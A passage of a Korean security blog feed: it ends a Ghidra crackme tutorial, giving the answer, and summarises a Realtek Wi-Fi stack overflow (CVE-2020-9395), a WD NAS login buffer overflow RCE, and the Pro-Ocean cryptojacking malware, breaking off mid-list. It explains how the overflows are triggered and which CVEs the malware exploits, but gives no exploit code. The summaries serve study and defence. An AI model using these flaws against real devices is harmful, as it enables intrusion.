&#xD480;&#xC5B4;&#xBCFC; &#xC218; &#xC788;&#xC744; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC77C;&#xB2E8; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD574;&#xC11C; &#xC5B4;&#xB5A0;&#xD55C; &#xB140;&#xC11D;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xC744; &#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2028.png" alt></p><p>&#xB9DE;&#xB294; Input &#xAC12;&#xC744; &#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xAD70;&#xC694;.(<del>Crackme&#xB2C8;&#xAE4C;&#x2026; &#xB2F9;&#xC5F0;&#xD558;&#xACA0;&#xC9C0;</del>) ghidra&#xB97C; &#xD655;&#xC778;&#xD574;&#xC11C; &#xB9DE;&#xB294; input&#xC774; &#xBB34;&#xC5C7;&#xC778;&#xC9C0; &#xCC3E;&#xC544;&#xBCF4;&#xB3C4;&#xB85D; &#xD569;&#xC2DC;&#xB2E4;!</p><p>ghidra&#xB97C; &#xC2E4;&#xD589;&#xD55C; &#xD6C4; Project &#xC0DD;&#xC131; &#xD6C4; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCD94;&#xAC00;&#xD558;&#xACE0;, &#xBD84;&#xC11D;&#xAE4C;&#xC9C0; &#xC644;&#xB8CC;&#xD55C; &#xD654;&#xBA74;&#xC5D0;&#xC11C; main &#xD654;&#xBA74;&#xC744; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. String &#xAC80;&#xC0C9;&#xC744; &#xD1B5;&#xD574; &#xCC3E;&#xC744; &#xC218;&#xB3C4; &#xC788;&#xC9C0;&#xB9CC;(&#xADF8;&#xAC8C; &#xB354; &#xAC04;&#xB2E8;&#xD558;&#xC9C0;&#xB9CC;), Symbol Tree&#xB97C; &#xD1B5;&#xD574; &#xCC3E;&#xC544;&#xBD05;&#xC2DC;&#xB2E4;. &#xC88C;&#xCE21; Symbol Tree&#xC5D0;&#xC11C; Function &#xC606; + &#xBC84;&#xD2BC;&#xC744; &#xB20C;&#xB7EC; &#xD3F4;&#xB354;&#xB97C; &#xC5F4;&#xC5B4;&#xC90D;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2029.png" alt></p><p><code>___main</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC11;&#xC73C;&#xB85C; &#xB354; &#xC2A4;&#xD06C;&#xB864;&#xD574;&#xC11C; &#xB2E4;&#xB978; &#xD568;&#xC218;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2030.png" alt></p><p><code>_main</code>&#xACFC; <code>_mainCRTStartup</code>&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. Entry Point&#xC778; <code>_mainCRTStartup</code>&#xC744; &#xD1B5;&#xD574; &#xC5B4;&#xB5A4; &#xAC8C; &#xCC98;&#xC74C; &#xC2DC;&#xC791;&#xB418;&#xB294; main &#xD568;&#xC218;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2031.png" alt></p><p><code>_mainCRTStartup</code>&#xC758; &#xB0B4;&#xC6A9;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB2C8; <code>___mingw_CRTStartup</code> &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB3C4; &#xD0D0;&#xC0C9;&#xC744; &#xD574;&#xBCFC;&#xAE4C;&#xC694;? &#xB354;&#xBE14;&#xD074;&#xB9AD;&#xC744; &#xD558;&#xBA74; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2032.png" alt></p><p><code>___main</code> &#xD568;&#xC218;&#xC640; <code>_main</code> &#xD568;&#xC218;&#xB97C; &#xCC28;&#xB840;&#xB300;&#xB85C; &#xC2E4;&#xD589;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC704;&#xC5D0; &#xD568;&#xC218;&#xBD80;&#xD130; &#xB4E4;&#xC5B4;&#xAC00; &#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2033.png" alt></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2034.png" alt></p><p>&#xC74C;&#x2026; &#xC2E4;&#xD589;&#xD588;&#xC744; &#xB54C; &#xB098;&#xC624;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xCD9C;&#xB825;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xC5C6;&#xB294; &#xAC78; &#xBCF4;&#xC544; <code>_main</code>&#xC774; &#xC9C4;&#xC9DC; &#xBA54;&#xC778; &#xD568;&#xC218;&#xC778; &#xAC83; &#xAC19;&#xB124;&#xC694;. &#xB4A4;&#xB85C; &#xAC00;&#xAC70;&#xB098; &#xC55E;&#xC73C;&#xB85C; &#xAC00;&#xB294; &#xAC83;&#xC740; &#xC88C;&#xCE21; &#xC0C1;&#xB2E8;&#xC758; &#xBC84;&#xD2BC;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAC70;&#xB098; <code>ALT + &#xC88C;&#xC6B0; &#xBC29;&#xD5A5;&#xD0A4;</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2035.png" alt></p><p><code>_main</code>&#xC73C;&#xB85C; &#xC624;&#xB2C8; &#xC704;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD588;&#xB358; &#xBB38;&#xC790;&#xC5F4;&#xB3C4; &#xCD9C;&#xB825;&#xB418;&#xACE0;, &#xC785;&#xB825; &#xAC12;&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xB3C4; &#xC788;&#xB124;&#xC694;. &#xC544;&#xBB34;&#xB798;&#xB3C4; &#xB09C;&#xC774;&#xB3C4; 1&#xC9DC;&#xB9AC; &#xAC04;&#xB2E8;&#xD55C; &#xBB38;&#xC81C;&#xC774;&#xB2E4; &#xBCF4;&#xB2C8; &#xBC14;&#xB85C; &#xD480;&#xB824;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;&#x314B;&#x314B;&#x314B;. &#xBB50; ghidra&#xB97C; &#xC5B4;&#xB5BB;&#xAC8C; &#xC0AC;&#xC6A9;&#xD558;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xB824;&#xACE0; &#xAC00;&#xC838;&#xC628; &#xBB38;&#xC81C;&#xB2C8;&#xAE4C;! <code>0x1232b14 = 19082004</code>&#xC774;&#xBBC0;&#xB85C; &#xC785;&#xB825;&#xC744; &#xD574;&#xC8FC;&#xBA74;&#x2026;</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2036.png" alt></p><p>&#xC815;&#xB2F5;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xB9C8;&#xCE58;&#xBA70;&#x2026;"><a href="#&#xB9C8;&#xCE58;&#xBA70;&#x2026;" class="headerlink" title="&#xB9C8;&#xCE58;&#xBA70;&#x2026;"></a>&#xB9C8;&#xCE58;&#xBA70;&#x2026;</h1><p>&#xC624;&#xB298;&#xC740; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; ghidra&#xB780; &#xBB34;&#xC5C7;&#xC778;&#xC9C0;, IDA&#xB791; &#xBE44;&#xAD50;&#xD588;&#xC744; &#xB54C; &#xC5B4;&#xB5A0;&#xD55C; &#xCC28;&#xC774;&#xC810;&#xC774; &#xC788;&#xB294;&#xC9C0;, ghidra&#xB294; &#xC5B4;&#xB5A0;&#xD55C; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294;&#xC9C0;&#xC5D0; &#xB300;&#xD574; Easy Crackme&#xB97C; &#xD480;&#xC5B4;&#xBCF4;&#xBA70; &#xAC04;&#xB2E8;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>Part 2&#xC5D0;&#xC11C;&#xB294; &#xC624;&#xB298; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC04; Data, Function, Scripts&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC880; &#xB354; &#xB2E4;&#xB904;&#xBCFC; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xAD6D;&#xB0B4;&#xC5D0;&#xB294; &#xC544;&#xC9C1; IDA Pro &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xB9CE;&#xC9C0;&#xB9CC; ghidra&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xBCF4;&#xACE0; &#xC2F6;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC774; &#xACC4;&#xC2DC;&#xB2E4;&#xAC70;&#xB098;, IDA Pro&#xB97C; &#xC811;&#xD558;&#xAE30; &#xD798;&#xB4E4;&#xC5B4;&#xC11C; ghidra&#xB97C; &#xC368;&#xBCF4;&#xACE0; &#xC2F6;&#xC740;&#xB370; &#xC798; &#xBAA8;&#xB974;&#xACA0;&#xB2E4; &#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xD070; &#xB3C4;&#xC6C0;&#xC774; &#xB410;&#xC73C;&#xBA74; &#xD558;&#xBA70;&#x2026;</p><p>&#xC798;&#xBABB;&#xB41C; &#xC124;&#xBA85;&#xC774;&#xB098;, &#xBD80;&#xC871;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xC5B8;&#xC81C;&#xB4E0; &#xB313;&#xAE00;&#xB85C; &#xB0A8;&#xACA8;&#xC8FC;&#xC2DC;&#xBA74; &#xBC18;&#xC601;&#xD558;&#xACE0; &#xC218;&#xC815;&#xD558;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7FC; &#xB2E4;&#xB4E4; &#xC88B;&#xC740; &#xBC24; &#xBCF4;&#xB0B4;&#xC138;&#xC694;~! &#xC800;&#xB294; &#xC774;&#xC81C; &#xC790;&#xB7EC; &#xAC00; &#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2037.png" alt></p><p><del>&#xBC24;&#xC5D0; &#xAE68;&#xC5B4;&#xC788;&#xACE0; &#xB0AE;&#xC5D0; &#xC790;&#xB294; &#xBC40;&#xD30C;&#xC774;&#xC5B4; &#xAC19;&#xC740; &#xBAA8;&#xC21C;&#xC801;&#xC778; &#xC0B6;&#x2026;</del></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dannyquist.github.io/gootkit-reversing-ghidra/">https://dannyquist.github.io/gootkit-reversing-ghidra/</a></p><p><a href="https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html">https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html</a></p><p><a href="https://ghidra.re/online-courses/">https://ghidra.re/online-courses/</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>crackme</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-9395: Realtek&#39;s Wi-Fi module remote root access</title>
    <link href="/2021/02/06/fabu1ous/2021-02-06/"/>
    <url>/2021/02/06/fabu1ous/2021-02-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.vdoo.com/blog/realtek-rtl8195a-vulnerabilities-discovered">Major Vulnerabilities discovered and patched in Realtek RTL8195A Wi-Fi Module</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Realtek&#x2019;s RTL8195A Wi-Fi module </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Vdoo&#xAC00; Realtek RTL8195A Wi-Fi &#xBAA8;&#xB4C8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;(CVE-2020-9395)&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. RTL8195A&#xB294; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xC6A9; low-power Wi-Fi &#xBAA8;&#xB4C8;&#xB85C; WPA2 handshake &#xB3D9;&#xC791;&#xC5D0; stack overflow, out-of-bound read &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xD574;&#xCEE4;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD1B5;&#xD574; &#xC6D0;&#xACA9;&#xC73C;&#xB85C; &#xBAA8;&#xB4C8;&#xC758; root&#xB97C; &#xD0C8;&#xCDE8;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774; &#xBAA8;&#xB4C8;&#xC774; &#xD0D1;&#xC7AC;&#xB41C; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC7A5;&#xBE44;&#xC758; &#xBAA8;&#xB4E0; &#xBB34;&#xC120; &#xD1B5;&#xC2E0;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>WPA2 handshake&#xC758; EAPOL-Key &#xAD50;&#xD658; &#xC791;&#xC5C5; &#xC911; Client&#xB294; <code>ClientEAPOLKeyRecvd()</code>&#xB97C; Server&#xB294; <code>EAPOLKeyRecvd()</code>&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;. &#xB450; &#xD568;&#xC218; &#xBAA8;&#xB450; <code>CheckMIC()</code>&#xB97C; &#xD638;&#xCD9C;&#xD574; EAP &#xD328;&#xD0B7;&#xC758; MIC&#xC5D0; &#xB300;&#xD55C; &#xBB34;&#xACB0;&#xC131; &#xAC80;&#xC99D;&#xC744; &#xC9C4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs c">rtl_memcpy(tmpbuf, EAPOLMsgRecvd.Octet, EAPOLMsgRecvd.Length);</code></pre><p><code>ChckMIC()</code>&#xC5D0;&#xB294; unsafe copy&#xB97C; &#xD558;&#xB294; &#xCF54;&#xB4DC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. tmpbuf&#xC758; &#xD06C;&#xAE30;&#xB294; 512 bytes&#xB85C; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; <code>EAPOLMsgRecvd.Octet</code>&#xC640; <code>EAPOLMsgRecvd.Length</code> &#xBAA8;&#xB450; &#xD574;&#xCEE4;&#xAC00; &#xC544;&#xBB34; &#xC81C;&#xC57D; &#xC5C6;&#xC774; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(attack-controlled). NX-bit, ASLR, Canary &#xB4F1; &#xBCF4;&#xD638; &#xAE30;&#xBC95;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC544; tmpbuf &#xBCF4;&#xB2E4; &#xD070; &#xC0AC;&#xC774;&#xC988;&#xC758; &#xC870;&#xC791;&#xB41C; packet&#xC744; &#xD1B5;&#xD574; <code>CheckMIC()</code>&#xC758; &#xB9AC;&#xD134; &#xC8FC;&#xC18C;&#xB97C; &#xC870;&#xC791;&#xD574; RCE &#xB610;&#xB294; DoS &#xB4F1;&#xC758; &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>wifi</tag>
      
      <tag>embedded</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Stack-based buffer overflow RCE in WD NAS</title>
    <link href="/2021/02/05/l0ch/2021-02-05/"/>
    <url>/2021/02/05/l0ch/2021-02-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/">Pwn2Own: A Tale of a Bug Found and Lost Again</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>My Cloud Pro Series PR4100 2.31.204 (2019-12-16), 2.40.155 (2020-07-28), 2.40.157 (2020-10-20)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xD558;&#xB4DC;&#xB514;&#xC2A4;&#xD06C; &#xC0DD;&#xC0B0; &#xC5C5;&#xCCB4; Western Digital(WD)&#xC758; &#xB300;&#xC6A9;&#xB7C9; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xC2A4;&#xD1A0;&#xB9AC;&#xC9C0; My Cloud Pro &#xC81C;&#xD488;&#xC5D0;&#xC11C; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC624;&#xBC84;&#xD50C;&#xB85C;&#xC6B0;&#xB97C; &#xD1B5;&#xD55C; root &#xAD8C;&#xD55C; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>CGI &#xBC14;&#xC774;&#xB108;&#xB9AC; <code>login_mgr.cgi</code>&#xB294; &#xB85C;&#xADF8;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC640; &#xAD00;&#xB828;&#xB41C; &#xC5EC;&#xB7EC; &#xB8E8;&#xD2F4;&#xC744; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>login_mar.cgi</code>&#xC758; <code>wd_login()</code> &#xD568;&#xC218;&#xB294; ID&#xC640; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xB97C; &#xAC01;&#xAC01; <code>username</code>&#xACFC; <code>pwd</code> &#xB9E4;&#xAC1C; &#xBCC0;&#xC218;&#xB85C; &#xBC1B;&#xC544; &#xC778;&#xC99D; &#xC2DC;&#xB3C4;&#xB97C; &#xD558;&#xB294;&#xB370;, &#xC774;&#xB54C; <code>pwd</code>&#xB294; Base64 &#xC778;&#xCF54;&#xB529; &#xB41C; &#xAC12;&#xC774;&#xC5B4;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>cgiFormString()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>username</code>&#xACFC; <code>pwd</code>&#xB97C; &#xC2A4;&#xD0DD; &#xBC84;&#xD37C; &#xC778; <code>username</code>&#xACFC; <code>pwd_b64</code>&#xC5D0; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;.  <code>base64decode()</code> &#xD568;&#xC218;&#xB294; <code>pwd_b64</code>&#xB97C; Base64 &#xB514;&#xCF54;&#xB529;&#xD574; <code>pwd_decoded</code>&#xC5D0; &#xC800;&#xC7A5;&#xD558;&#xBA70; &#xB514;&#xCF54;&#xB529;&#xC740; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; glibc&#xC758; <code>b64_pton()</code>&#xC5D0;&#xC11C; &#xC774;&#xB8E8;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> pwd_decoded[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-1178h] BYREF</span><span class="hljs-keyword">char</span> pwd_b64[<span class="hljs-number">256</span>];    <span class="hljs-comment">// [rsp+D0h] [rbp-1138h] BYREF</span></code></pre><p>&#xB514;&#xCF54;&#xB529; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xB514;&#xCF54;&#xB529; &#xC804; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xC778; <code>pwd_b64</code>&#xC758; &#xD06C;&#xAE30;&#xB294; 256 bytes&#xC774;&#xC9C0;&#xB9CC; &#xB514;&#xCF54;&#xB529;&#xB41C; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC;&#xAC00; &#xBCF5;&#xC0AC;&#xB418;&#xB294; <code>pwd_decoded</code>&#xC758; &#xD06C;&#xAE30;&#xB294; 64 bytes&#xC785;&#xB2C8;&#xB2E4;. 256 bytes &#xAE38;&#xC774;&#xC758; base64 &#xC778;&#xCF54;&#xB529; &#xAC12;&#xC758; &#xCD5C;&#xB300; &#xB514;&#xCF54;&#xB529; &#xBB38;&#xC790;&#xC5F4; &#xAE38;&#xC774;&#xB294; 192 bytes&#xB85C; 64 bytes &#xD06C;&#xAE30;&#xC778; <code>pwd_decoded</code>&#xC5D0; 128 bytes &#xB9CC;&#xD07C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xB354; &#xC4F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> password_copy_shadow[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+ 0h] [rbp-C8h] BYREF</span><span class="hljs-keyword">char</span> password_copy_input[<span class="hljs-number">88</span>];  <span class="hljs-comment">// [rsp+50h] [rbp-78h] BYREF</span></code></pre><p>&#xC774;&#xD6C4; <code>check_login()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>/etc/shadow</code>&#xC758; &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xD574;&#xC2DC;&#xC640; &#xBE44;&#xAD50;&#xD558;&#xAE30; &#xC704;&#xD574; <code>strcpy()</code>&#xB85C; <code>pwd_decoded</code> &#xC5D0;&#xC11C; <code>password_copy_input</code>&#xC73C;&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC774;&#xC804; &#xC624;&#xBC84;&#xD50C;&#xB85C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; 192 bytes &#xD06C;&#xAE30;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC788;&#xB294; <code>pwd_decoded</code>&#xC5D0;&#xC11C; &#xBCF5;&#xC0AC;&#xD558;&#xACE0; &#xC774;&#xB294; <code>check_login()</code>&#xC758; &#xBC18;&#xD658; &#xC8FC;&#xC18C;&#xB97C; &#xB36E;&#xC5B4; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bof</tag>
      
      <tag>rce</tag>
      
      <tag>buffer overflow</tag>
      
      <tag>L0ch</tag>
      
      <tag>nas</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Pro-Ocean: Rocke Group&#39;s New Cryptojacking Malware</title>
    <link href="/2021/02/04/idioth/2021-02-04/"/>
    <url>/2021/02/04/idioth/2021-02-04/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://unit42.paloaltonetworks.com/pro-ocean-rocke-groups-new-cryptojacking-malware/">Pro-Ocean: Rocke Group&#x2019;s New Cryptojacking Malware</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Apache, Orcale, Redis, Tecent Cloud, Alibaba Cloud &#xB4F1; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>2019&#xB144; Rocke Group&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; Monero &#xCC44;&#xAD74;&#xAE30;&#xC5D0; &#xB300;&#xD55C; &#xBB38;&#xC11C;&#xAC00; &#xACF5;&#xAC1C;&#xB41C; &#xD6C4; &#xBA40;&#xC6E8;&#xC5B4;&#xAC00; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD5A5;&#xC0C1;&#xB41C; &#xB8E8;&#xD2B8;&#xD0B7;&#xACFC; &#xC6DC;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBCF4;&#xC548; &#xD68C;&#xC0AC;&#xB4E4;&#xC758; &#xD0D0;&#xC9C0; &#xAE30;&#xC220;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xACE0; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC560;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158;&#xC744; &#xD0C0;&#xAE43;&#xC73C;&#xB85C; &#xD55C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC54C;&#xB824;&#xC9C4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC0AC;&#xC6A9;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>Apache ActiveMQ(CVE-2016-3088)</li><li>Oracle WebLogic(CVE-2017-10271)</li><li>Redis(unsecure instances)</li></ul><p>Pro-Ocean&#xC740; XMRig Miner&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xBA70; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xB09C;&#xB3C5;&#xD654; &#xB808;&#xC774;&#xC5B4;&#xB97C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>UPX&#xB85C; &#xD328;&#xD0B9;&#xB418;&#xC5B4; &#xC788;&#xACE0; &#xD0D0;&#xC9C0;&#xB97C; &#xD53C;&#xD558;&#xAE30; &#xC704;&#xD574; UPX magic string&#xC744; &#xC0AD;&#xC81C;</li><li>&#xC5B8;&#xD329; &#xB41C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC548;&#xC5D0; &#xBAA8;&#xB4C8;&#xC774; gzip&#xC73C;&#xB85C; &#xC555;&#xCD95;&#xB418;&#xC5B4; &#xC788;&#xACE0;, XMRig &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; &#xC555;&#xCD95;&#xB41C; &#xBAA8;&#xB4C8; &#xC548;&#xC5D0; &#xC874;&#xC7AC;</li><li>XMRig &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xB610;&#xD55C; UPX&#xB85C; &#xD328;&#xD0B9;&#xB418;&#xC5B4; &#xC788;&#xACE0; magic string&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC74C;</li></ul><p>Pro-Ocean&#xC758; 4&#xAC00;&#xC9C0; &#xBAA8;&#xB4C8;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xCD94;&#xCD9C;&#xB418;&#xACE0; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><ol><li><code>main_ReleaseExerkt</code>&#xC744; &#xD1B5;&#xD574; Rootkit Module&#xC774; &#xC2E4;&#xD589;, &#xB8E8;&#xD2B8;&#xD0B7;&#xACFC; &#xC545;&#xC131; &#xC11C;&#xBE44;&#xC2A4; &#xC124;&#xCE58;</li><li><code>main_ReleaseExe</code>&#xB97C; &#xD1B5;&#xD574; XMRig Miner &#xC2E4;&#xD589;</li><li><code>main_ReleaseExelk</code>&#xB97C; &#xD1B5;&#xD574; Watchdog 